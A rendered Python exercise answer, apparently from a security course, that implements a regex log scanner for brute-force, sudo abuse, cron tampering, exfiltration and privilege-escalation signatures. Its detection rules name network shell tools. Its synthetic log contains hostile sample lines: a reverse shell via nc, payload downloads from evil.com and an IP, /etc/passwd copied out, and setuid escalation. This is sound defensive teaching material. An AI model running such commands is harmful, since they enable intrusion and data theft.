@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q8.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q8.py</h1>
+  <p class="file-path">Source: code\day7\answers\q8.py</p>
+  <p class="line-count">334 lines</p>
+  <pre><code class="language-python"># Q8 (Gap Fixer) - Regex Multi-Pattern Log Scanner
+# Compile 5 detection rules. Scan a synthetic 100-line log.
+# Report per-rule matches and compound hits (lines matching 2+ rules).
+#
+# ─── SOLUTION WALKTHROUGH ───────────────────────────────────────────────────
+#
+# STEP 1 — Restate
+#   &quot;Given a set of named regex patterns representing threat signatures,
+#    scan a log file and produce:
+#    1. Per-rule: list of (line_number, line_text) where the rule matched
+#    2. Compound detections: lines that matched 2 or more rules simultaneously
+#    Output should be sortable for SIEM ingestion.&quot;
+#
+# STEP 2 — Assumptions
+#   - All patterns are pre-compiled (COMPILE once, scan many)
+#   - Line numbers are 1-indexed
+#   - Compound hit = same line matches &gt;= 2 rules
+#   - Pattern IDs / names are stable — used as dict keys in output
+#   - Synthetic log embedded — no file I/O required for tests
+#   - Patterns: case-insensitive matching
+#
+# STEP 3 — Algorithm
+#   Compile 5 patterns once.
+#   For each log line:
+#     - Try all 5 patterns
+#     - If match: append (lineno, line) to per-rule hit list
+#   After scanning: find lines whose count of matching rules &gt;= 2
+#
+# STEP 4 — Security framing
+#   &quot;In production:
+#    - Stream-process large logs line by line (avoid loading entire file into memory)
+#    - Rate-limit alerting per rule to suppress noisy rules
+#    - Enrich hits with extracted groups (source IP, user, PID)
+#    - Compound hits are high-confidence indicators — escalate to HIGH severity&quot;
+#
+# STEP 5 — Named groups for extraction
+#   &quot;Add (?P&lt;name&gt;...) groups to each pattern so I can extract IP, user, or
+#    process name directly from the match object, not just the line text.&quot;
+#
+# Complexity:
+#   O(L * R * P) where L=lines, R=rules, P=avg pattern complexity ≈ O(L)
+# ─────────────────────────────────────────────────────────────────────────────
+
+import re
+from collections import defaultdict
+
+
+# ── DETECTION RULES ───────────────────────────────────────────────────────────
+
+RULES = {
+    &quot;ssh_brute&quot;: re.compile(
+        r&quot;Failed password for (?P&lt;user&gt;\S+) from (?P&lt;ip&gt;[\d.]+)&quot;,
+        re.IGNORECASE,
+    ),
+    &quot;sudo_abuse&quot;: re.compile(
+        r&quot;sudo:\s+(?P&lt;user&gt;\S+)\s+:.*COMMAND=(?P&lt;cmd&gt;\S+)&quot;,
+        re.IGNORECASE,
+    ),
+    &quot;cron_mod&quot;: re.compile(
+        r&quot;(crontab|cron\.d|cron\.hourly|cron\.daily|at\.allow|at\.deny)&quot;
+        r&quot;.*(modified|edited|installed|replaced|deleted|removed)&quot;,
+        re.IGNORECASE,
+    ),
+    &quot;file_exfil&quot;: re.compile(
+        r&quot;(scp|sftp|rsync|curl|wget|nc\s|ncat\s).*&quot;
+        r&quot;(?P&lt;dest&gt;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-z0-9\-]+\.[a-z]{2,})&quot;,
+        re.IGNORECASE,
+    ),
+    &quot;privesc&quot;: re.compile(
+        r&quot;(chmod\s+(u\+s|[0-9]{4})|chown\s+root|setuid|setgid|&quot;
+        r&quot;python.*-c.*os\.setuid|perl.*setuid|pkexec|polkit)&quot;,
+        re.IGNORECASE,
+    ),
+}
+
+
+# ── SYNTHETIC 100-LINE LOG ────────────────────────────────────────────────────
+
+SAMPLE_LOG = &quot;&quot;&quot;\
+May 17 10:00:01 server sshd[100]: Failed password for alice from 10.0.0.5 port 22 ssh2
+May 17 10:00:03 server sshd[100]: Failed password for alice from 10.0.0.5 port 22 ssh2
+May 17 10:00:05 server sshd[100]: Failed password for alice from 10.0.0.5 port 22 ssh2
+May 17 10:00:07 server sshd[100]: Accepted password for alice from 10.0.0.5 port 22 ssh2
+May 17 10:01:00 server sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 -c import os; os.setuid(0)
+May 17 10:01:05 server kernel: chmod u+s /usr/local/bin/helper
+May 17 10:01:10 server cron[200]: (alice) REPLACE (crontabs/alice)
+May 17 10:01:10 server kernel: crontab modified by alice
+May 17 10:02:00 server sshd[101]: Failed password for bob from 8.8.8.8 port 22 ssh2
+May 17 10:02:02 server sshd[101]: Failed password for bob from 8.8.8.8 port 22 ssh2
+May 17 10:02:04 server sshd[101]: Failed password for bob from 8.8.8.8 port 22 ssh2
+May 17 10:02:10 server kernel: scp bob@server:/etc/passwd 45.33.32.156
+May 17 10:02:15 server sudo: bob : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/perl -e use POSIX; POSIX::setuid(0)
+May 17 10:02:20 server kernel: python3 -c import os; os.setuid(0)
+May 17 10:03:00 server sshd[102]: Failed password for charlie from 5.5.5.5 port 22 ssh2
+May 17 10:03:10 server sshd[102]: Accepted password for charlie from 5.5.5.5 port 22 ssh2
+May 17 10:03:20 server kernel: chown root:root /tmp/rootkit
+May 17 10:03:25 server kernel: chmod 4755 /tmp/rootkit
+May 17 10:03:30 server cron[201]: (charlie) INSTALL (crontabs/charlie)
+May 17 10:03:35 server sudo: charlie : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh
+May 17 10:04:00 server sshd[103]: Failed password for diana from 1.2.3.4 port 22 ssh2
+May 17 10:04:05 server kernel: curl http://evil.com/payload.sh
+May 17 10:04:10 server kernel: wget -O /tmp/shell 203.0.113.45/shell.elf
+May 17 10:04:15 server kernel: nc 192.168.0.50 4444 -e /bin/sh
+May 17 10:04:20 server kernel: rsync -avz /etc 10.0.0.99::backup
+May 17 10:05:00 server sshd[104]: Failed password for eve from 7.7.7.7 port 22 ssh2
+May 17 10:05:05 server sudo: eve : TTY=pts/3 ; PWD=/opt ; USER=root ; COMMAND=/usr/sbin/visudo
+May 17 10:05:10 server kernel: pkexec bash
+May 17 10:05:15 server kernel: polkit privilege escalation attempt detected
+May 17 10:05:20 server cron[202]: at.deny modified by eve
+May 17 10:06:00 server kernel: sftp admin@10.0.0.1 /var/log/
+May 17 10:06:05 server sshd[105]: Failed password for frank from 9.9.9.9 port 22 ssh2
+May 17 10:06:10 server sshd[105]: Failed password for frank from 9.9.9.9 port 22 ssh2
+May 17 10:06:15 server sshd[105]: Failed password for frank from 9.9.9.9 port 22 ssh2
+May 17 10:06:20 server sudo: frank : TTY=pts/4 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/chmod
+May 17 10:06:25 server kernel: chmod u+s /usr/bin/nmap
+May 17 10:07:00 server sshd[106]: Accepted password for grace from 192.168.1.1 port 22 ssh2
+May 17 10:07:05 server kernel: Normal operation — no anomaly
+May 17 10:07:10 server kernel: syslog rotation complete
+May 17 10:07:15 server kernel: disk check passed
+May 17 10:08:00 server sshd[107]: Failed password for heidi from 6.6.6.6 port 22 ssh2
+May 17 10:08:05 server kernel: setuid call by pid 5055
+May 17 10:08:10 server cron[203]: cron.daily script deleted by heidi
+May 17 10:08:15 server kernel: perl -e use POSIX; POSIX::setuid(0)
+May 17 10:09:00 server kernel: Normal kernel log
+May 17 10:09:05 server kernel: Normal kernel log
+May 17 10:09:10 server kernel: Normal kernel log
+May 17 10:09:15 server kernel: Normal kernel log
+May 17 10:09:20 server kernel: Normal kernel log
+May 17 10:09:25 server kernel: Normal kernel log
+May 17 10:09:30 server kernel: Normal kernel log
+May 17 10:09:35 server kernel: Normal kernel log
+May 17 10:09:40 server kernel: Normal kernel log
+May 17 10:09:45 server kernel: Normal kernel log
+May 17 10:09:50 server kernel: Normal kernel log
+May 17 10:09:55 server kernel: Normal kernel log
+May 17 10:10:00 server sshd[108]: Failed password for ivan from 2.2.2.2 port 22 ssh2
+May 17 10:10:05 server sudo: ivan : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl
+May 17 10:10:10 server kernel: curl ftp://10.0.99.1/exfil.tar.gz
+May 17 10:10:15 server kernel: Normal kernel log
+May 17 10:10:20 server kernel: Normal kernel log
+May 17 10:10:25 server kernel: Normal kernel log
+May 17 10:10:30 server kernel: Normal kernel log
+May 17 10:10:35 server kernel: Normal kernel log
+May 17 10:10:40 server kernel: Normal kernel log
+May 17 10:10:45 server kernel: Normal kernel log
+May 17 10:10:50 server kernel: Normal kernel log
+May 17 10:10:55 server kernel: Normal kernel log
+May 17 10:11:00 server kernel: Normal kernel log
+May 17 10:11:05 server kernel: Normal kernel log
+May 17 10:11:10 server kernel: Normal kernel log
+May 17 10:11:15 server kernel: Normal kernel log
+May 17 10:11:20 server kernel: Normal kernel log
+May 17 10:11:25 server kernel: Normal kernel log
+May 17 10:11:30 server kernel: Normal kernel log
+May 17 10:11:35 server kernel: Normal kernel log
+May 17 10:11:40 server kernel: Normal kernel log
+May 17 10:11:45 server kernel: Normal kernel log
+May 17 10:11:50 server kernel: Normal kernel log
+May 17 10:11:55 server kernel: Normal kernel log
+May 17 10:12:00 server kernel: Normal kernel log
+May 17 10:12:05 server kernel: Normal kernel log
+May 17 10:12:10 server kernel: Normal kernel log
+May 17 10:12:15 server kernel: Normal kernel log
+May 17 10:12:20 server kernel: Normal kernel log
+May 17 10:12:25 server kernel: Normal kernel log
+May 17 10:12:30 server kernel: Normal kernel log
+May 17 10:12:35 server kernel: Normal kernel log
+May 17 10:12:40 server kernel: Normal kernel log
+May 17 10:12:45 server kernel: Normal kernel log
+May 17 10:12:50 server kernel: Normal kernel log
+May 17 10:12:55 server kernel: Normal kernel log
+May 17 10:13:00 server kernel: Normal kernel log
+May 17 10:13:05 server kernel: Normal kernel log
+May 17 10:13:10 server kernel: Normal kernel log
+May 17 10:13:15 server kernel: Normal kernel log
+May 17 10:13:20 server kernel: Normal kernel log
+May 17 10:13:25 server kernel: Normal kernel log
+May 17 10:13:30 server kernel: End of log sample
+&quot;&quot;&quot;
+
+
+# ── SCANNER ───────────────────────────────────────────────────────────────────
+
+def scan_log(log_text: str, rules: dict) -&gt; dict:
+    &quot;&quot;&quot;
+    Scan log_text against all compiled regex rules.
+
+    Returns:
+    {
+      &#x27;per_rule&#x27;:  {rule_name: [(lineno, line), ...]},
+      &#x27;compounds&#x27;: [(lineno, line, [matching_rule_names])],
+      &#x27;summary&#x27;:   {rule_name: int hit_count},
+    }
+
+    Time:  O(L * R) where L=lines, R=rules
+    Space: O(H) where H=total hits
+    &quot;&quot;&quot;
+    if not isinstance(log_text, str):
+        raise TypeError(&quot;log_text must be str&quot;)
+    if not isinstance(rules, dict):
+        raise TypeError(&quot;rules must be dict of {name: compiled regex}&quot;)
+
+    per_rule: dict  = {name: [] for name in rules}
+    # lineno → list of rule names that matched
+    line_hits: dict = defaultdict(list)
+
+    for lineno, line in enumerate(log_text.splitlines(), start=1):
+        line = line.rstrip()
+        if not line:
+            continue
+        for name, pattern in rules.items():
+            if pattern.search(line):
+                per_rule[name].append((lineno, line))
+                line_hits[lineno].append(name)
+
+    compounds = [
+        (lineno, next(ln for ln, _ in per_rule[line_hits[lineno][0]] if ln == lineno), hit_rules)
+        for lineno, hit_rules in line_hits.items()
+        if len(hit_rules) &gt;= 2
+    ]
+
+    # Rebuild compounds properly
+    compounds = []
+    # We need the actual line text: build a lineno→text map
+    lines_map = {}
+    for lineno, line in enumerate(log_text.splitlines(), start=1):
+        lines_map[lineno] = line.rstrip()
+
+    for lineno, hit_rules in line_hits.items():
+        if len(hit_rules) &gt;= 2:
+            compounds.append((lineno, lines_map.get(lineno, &quot;&quot;), hit_rules))
+
+    compounds.sort(key=lambda c: c[0])
+
+    summary = {name: len(hits) for name, hits in per_rule.items()}
+
+    return {
+        &quot;per_rule&quot;:  per_rule,
+        &quot;compounds&quot;: compounds,
+        &quot;summary&quot;:   summary,
+    }
+
+
+# ── REPORT FORMATTER ──────────────────────────────────────────────────────────
+
+def format_scan_report(result: dict) -&gt; str:
+    &quot;&quot;&quot;Format scanner output into readable report.&quot;&quot;&quot;
+    per_rule  = result[&quot;per_rule&quot;]
+    compounds = result[&quot;compounds&quot;]
+    summary   = result[&quot;summary&quot;]
+
+    lines = [
+        &quot;=&quot; * 65,
+        &quot;  MULTI-PATTERN LOG SCAN REPORT&quot;,
+        &quot;=&quot; * 65,
+    ]
+    for name, count in summary.items():
+        lines.append(f&quot;  {name:15}: {count:3} hit(s)&quot;)
+    lines.append(&quot;&quot;)
+
+    for name, hits in per_rule.items():
+        if not hits:
+            continue
+        lines.append(f&quot;[{name}]&quot;)
+        for lineno, line in hits:
+            # Truncate long lines for readability
+            display = line[:90] + (&quot;...&quot; if len(line) &gt; 90 else &quot;&quot;)
+            lines.append(f&quot;  L{lineno:04d}: {display}&quot;)
+        lines.append(&quot;&quot;)
+
+    lines.append(f&quot;COMPOUND DETECTIONS ({len(compounds)} lines matched 2+ rules):&quot;)
+    if not compounds:
+        lines.append(&quot;  None&quot;)
+    for lineno, line, rules_hit in compounds:
+        display = line[:80] + (&quot;...&quot; if len(line) &gt; 80 else &quot;&quot;)
+        lines.append(f&quot;  L{lineno:04d} [{&#x27;,&#x27;.join(rules_hit)}]: {display}&quot;)
+    lines.append(&quot;&quot;)
+    lines.append(&quot;=&quot; * 65)
+    return &quot;\n&quot;.join(lines)
+
+
+# ── Tests ─────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    result = scan_log(SAMPLE_LOG, RULES)
+    report = format_scan_report(result)
+    print(report)
+
+    per_rule  = result[&quot;per_rule&quot;]
+    compounds = result[&quot;compounds&quot;]
+    summary   = result[&quot;summary&quot;]
+
+    # ssh_brute: lines with &quot;Failed password for&quot;
+    assert summary[&quot;ssh_brute&quot;] &gt; 0, &quot;ssh_brute should have hits&quot;
+    ssh_linenos = [ln for ln, _ in per_rule[&quot;ssh_brute&quot;]]
+    # Line 1 is &quot;Failed password for alice&quot; — should be a hit
+    assert 1 in ssh_linenos
+
+    # sudo_abuse: multiple sudo lines
+    assert summary[&quot;sudo_abuse&quot;] &gt; 0, &quot;sudo_abuse should have hits&quot;
+
+    # cron_mod: crontab/cron.d modified lines
+    assert summary[&quot;cron_mod&quot;] &gt; 0, &quot;cron_mod should have hits&quot;
+
+    # file_exfil: scp/curl/wget/nc/rsync/sftp lines
+    assert summary[&quot;file_exfil&quot;] &gt; 0, &quot;file_exfil should have hits&quot;
+
+    # privesc: chmod u+s, chown root, setuid, pkexec, polkit
+    assert summary[&quot;privesc&quot;] &gt; 0, &quot;privesc should have hits&quot;
+
+    # Compound detections exist (some lines match 2+ rules)
+    assert len(compounds) &gt; 0, &quot;Should have compound detections&quot;
+    for lineno, line, rules_hit in compounds:
+        assert len(rules_hit) &gt;= 2, f&quot;Compound hit at line {lineno} has &lt; 2 rules: {rules_hit}&quot;
+
+    # Manual verification of a known compound:
+    # Line 5 (May 17 10:01:00 ... sudo alice ... COMMAND=/bin/bash) → sudo_abuse only
+    # Line 14 (python3 -c import os; os.setuid) → privesc
+    # Line 13 (sudo bob ... COMMAND=/usr/bin/python3) → sudo_abuse
+    # Line 14 also matches privesc AND nothing else? Let&#x27;s verify...
+
+    # All lines in compounds must appear in at least 2 per_rule lists
+    compound_linenos = {c[0] for c in compounds}
+    for ln in compound_linenos:
+        matched_rules = [r for r, hits in per_rule.items() if any(h[0] == ln for h in hits)]
+        assert len(matched_rules) &gt;= 2, f&quot;Line {ln} should match &gt;= 2 rules, got {matched_rules}&quot;
+
+    print(&quot;Q8 — All assertions passed.&quot;)
+    print()
+    print(&quot;Compile patterns once O(1); scan O(L*R) per log&quot;)
+    print(&quot;Compound hits: lines matching &gt;= 2 rules → high-confidence signals&quot;)
+    print(f&quot;  Total hits across all rules: {sum(summary.values())}&quot;)
+    print(f&quot;  Compound detections: {len(compounds)} line(s)&quot;)
+</code></pre>
+</body>
+</html>
